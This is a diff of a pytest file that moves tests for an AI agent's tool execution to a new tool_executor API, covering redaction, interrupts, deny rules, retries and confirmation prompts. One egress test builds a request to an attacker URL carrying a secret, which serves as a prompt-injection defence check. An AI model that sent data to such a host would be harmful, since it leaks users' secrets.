@@ -14,6 +14,7 @@ from nova.agent import NovaAgent
 from nova.harness import HarnessTrace, ToolTrace
 from nova.session import SessionStore
 from nova.tools.registry import discover_builtin_tools
+from nova.tools.result import ToolResult
 
 
 @pytest.fixture
@@ -79,7 +80,7 @@ def test_execute_tool_calls_parallel_read_only_success(minimal_config, mock_sess
     ]
 
     # Should execute parallel read-only calls
-    results = agent._execute_tool_calls_parallel(tool_calls)
+    results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
     assert len(results) == len(tool_calls)
 
 
@@ -112,7 +113,7 @@ def test_execute_tool_calls_parallel_with_write_sequential(minimal_config, mock_
 
     # Should handle mixed read/write
     try:
-        results = agent._execute_tool_calls_parallel(tool_calls)
+        results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
         assert len(results) >= 1
     except Exception:
         # Some tools might fail, that's ok for this test
@@ -139,7 +140,7 @@ def test_execute_tool_calls_invalid_json(minimal_config, mock_session_store):
     ]
 
     # Should handle invalid JSON gracefully
-    results = agent._execute_tool_calls_parallel(tool_calls)
+    results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
     assert len(results) > 0
     assert "Error" in results[0] or "error" in results[0].lower()
 
@@ -151,7 +152,7 @@ def test_invalid_json_error_redacts_embedded_credentials(minimal_config, mock_se
         session_store=mock_session_store,
     )
 
-    result = agent._execute_tool_call(
+    result = agent.tool_executor.run(
         {
             "id": "call_secret",
             "function": {
@@ -159,7 +160,7 @@ def test_invalid_json_error_redacts_embedded_credentials(minimal_config, mock_se
                 "arguments": '{"api_key":"leaked-key", invalid}',
             },
         }
-    )
+    ).content
 
     assert result == 'Error: Invalid JSON arguments: {"api_key":"[REDACTED]", invalid}'
     assert "leaked-key" not in result
@@ -182,7 +183,7 @@ def test_execute_tool_call_unknown_tool(minimal_config, mock_session_store):
         },
     }
 
-    result = agent._execute_tool_call(tool_call)
+    result = agent.tool_executor.run(tool_call).content
     assert "Error" in result or "error" in result.lower()
 
 
@@ -195,7 +196,7 @@ def test_execute_tool_calls_parallel_empty_list(minimal_config, mock_session_sto
         session_store=mock_session_store,
     )
 
-    results = agent._execute_tool_calls_parallel([])
+    results = [r.content for r in agent.tool_executor.run_batch([])]
     assert results == []
 
 
@@ -212,19 +213,19 @@ def test_interrupt_skips_remaining_mutating_tools(minimal_config, mock_session_s
         nonlocal interrupted
         executed.append(tool_call["id"])
         interrupted = True
-        return "ok"
+        return ToolResult("completed", "ok")
 
-    agent._execute_tool_call = execute
     agent._interrupt_check = lambda: interrupted
     calls = [
         {"id": "first", "function": {"name": "write_file", "arguments": "{}"}},
         {"id": "second", "function": {"name": "write_file", "arguments": "{}"}},
     ]
 
-    results = agent._execute_tool_calls_parallel(calls)
+    with patch.object(agent.tool_executor, "run", side_effect=execute):
+        results = agent.tool_executor.run_batch(calls)
 
     assert executed == ["first"]
-    assert results[1].startswith("[Interrupted")
+    assert results[1].status == "interrupted"
 
 
 @pytest.mark.parametrize("cancel_stage", ["approval", "pre_tool_hook"])
@@ -260,7 +261,7 @@ def test_cancellation_before_dispatch_prevents_write(
     }
 
     with patch("nova.agent.hooks.emit", side_effect=emit):
-        results = agent._execute_tool_calls_parallel([call])
+        results = [r.content for r in agent.tool_executor.run_batch([call])]
 
     assert results[0].startswith("[Interrupted")
     assert not (tmp_path / "output.txt").exists()
@@ -282,7 +283,7 @@ def test_agent_relative_deny_rule_uses_workspace(minimal_config, mock_session_st
     }
 
     with patch("nova.agent.registry.dispatch") as dispatch:
-        result = agent._execute_tool_call_impl(call)
+        result = agent.tool_executor.run(call).content
 
     assert "Path denied by rule" in result
     dispatch.assert_not_called()
@@ -314,7 +315,7 @@ def test_execute_tool_calls_parallel_callback_invoked(minimal_config, mock_sessi
         },
     ]
 
-    results = agent._execute_tool_calls_parallel(tool_calls)
+    results = [r.content for r in agent.tool_executor.run_batch(tool_calls)]
 
     # Callback may or may not be invoked depending on implementation
     assert len(results) > 0
@@ -323,7 +324,7 @@ def test_execute_tool_calls_parallel_callback_invoked(minimal_config, mock_sessi
 def _traced_call(agent: NovaAgent, call: dict) -> ToolTrace:
     agent._active_trace = HarnessTrace("run", "goal")
     try:
-        agent._execute_tool_call(call)
+        agent.tool_executor.run(call)
         return agent._active_trace.run.tool_traces[0]
     finally:
         agent._active_trace = None
@@ -421,16 +422,16 @@ def test_tool_callback_fires_before_execution_on_both_paths(minimal_config, mock
     events: list[str] = []
     agent._tool_callback = lambda name: events.append(f"announce:{name}")
 
-    def execute(call: dict) -> str:
+    def execute(call: dict) -> ToolResult:
         events.append(f"run:{call['function']['name']}")
-        return "ok"
+        return ToolResult("completed", "ok")
 
     calls = [
         {"id": "a", "function": {"name": "read_file", "arguments": "{}"}},
         {"id": "b", "function": {"name": "write_file", "arguments": "{}"}},
     ]
-    with patch.object(agent, "_execute_tool_call", side_effect=execute):
-        agent._execute_tool_calls_parallel(calls)
+    with patch.object(agent.tool_executor, "run", side_effect=execute):
+        agent.tool_executor.run_batch(calls)
 
     for name in ("read_file", "write_file"):
         assert events.index(f"announce:{name}") < events.index(f"run:{name}")
@@ -444,8 +445,8 @@ def test_parallel_tool_failure_hides_exception_message(minimal_config, mock_sess
     )
     call = {"id": "a", "function": {"name": "read_file", "arguments": "{}"}}
 
-    with patch.object(agent, "_execute_tool_call", side_effect=RuntimeError("token=s3cret")):
-        results = agent._execute_tool_calls_parallel([call])
+    with patch.object(agent.tool_executor, "run", side_effect=RuntimeError("token=s3cret")):
+        results = [r.content for r in agent.tool_executor.run_batch([call])]
 
     assert results == ["Error: Tool 'read_file' failed: RuntimeError"]
 
@@ -477,9 +478,9 @@ def test_read_only_tool_retries_only_transient_errors(
 
     with (
         patch("nova.agent.registry.dispatch", return_value=tool_output) as dispatch,
-        patch.object(agent, "_wait_unless_interrupted", return_value=False),
+        patch.object(agent.tool_executor, "_wait_unless_interrupted", return_value=False),
     ):
-        agent._execute_tool_call_impl(call)
+        agent.tool_executor.run(call)
 
     assert dispatch.call_count == expected_calls
 
@@ -499,7 +500,7 @@ def test_interrupt_during_tool_retry_wait_stops_retrying(
 
     with patch("nova.agent.registry.dispatch", side_effect=dispatch) as mock_dispatch:
         start = time.monotonic()
-        result = agent._execute_tool_call_impl(call)
+        result = agent.tool_executor.run(call).content
 
     assert result.startswith("[Interrupted")
     assert mock_dispatch.call_count == 1
@@ -531,10 +532,13 @@ def test_egress_after_untrusted_output_requires_confirmation(
     )
 
     with patch("nova.agent.registry.dispatch", return_value="page text") as dispatch:
-        first = agent._execute_tool_calls_parallel([_http_call("a")])
-        second = agent._execute_tool_calls_parallel(
-            [_http_call("b", "https://attacker.example/?d=secret"), _http_call("c")]
-        )
+        first = [r.content for r in agent.tool_executor.run_batch([_http_call("a")])]
+        second = [
+            r.content
+            for r in agent.tool_executor.run_batch(
+                [_http_call("b", "https://attacker.example/?d=secret"), _http_call("c")]
+            )
+        ]
 
     assert first == ["page text"]
     assert asked and all(name == "http_get" for name, _ in asked)
@@ -557,7 +561,7 @@ def test_untrusted_flag_restored_when_resuming_session(minimal_config, mock_sess
         session_id=session_id,
     )
 
-    assert agent._untrusted_content_seen is True
+    assert agent.tool_executor.untrusted_content_seen is True
 
 
 def _prompt_tool_names(prompt: str) -> set[str]:
@@ -628,7 +632,7 @@ def test_core_note_write_needs_confirmation_in_auto_mode(
     confirm = MagicMock(return_value=False)
     agent = _wiki_agent(minimal_config, mock_session_store, tmp_path, confirm)
 
-    result = agent._execute_tool_call(_wiki_call("Core/Rules"))
+    result = agent.tool_executor.run(_wiki_call("Core/Rules")).content
 
     assert "requires confirmation" in result
     assert confirm.call_count == 1
@@ -641,7 +645,7 @@ def test_ordinary_note_write_needs_no_confirmation_in_auto_mode(
     confirm = MagicMock(return_value=False)
     agent = _wiki_agent(minimal_config, mock_session_store, tmp_path, confirm)
 
-    result = agent._execute_tool_call(_wiki_call("Projects/nova"))
+    result = agent.tool_executor.run(_wiki_call("Projects/nova")).content
 
     assert "requires confirmation" not in result
     confirm.assert_not_called()
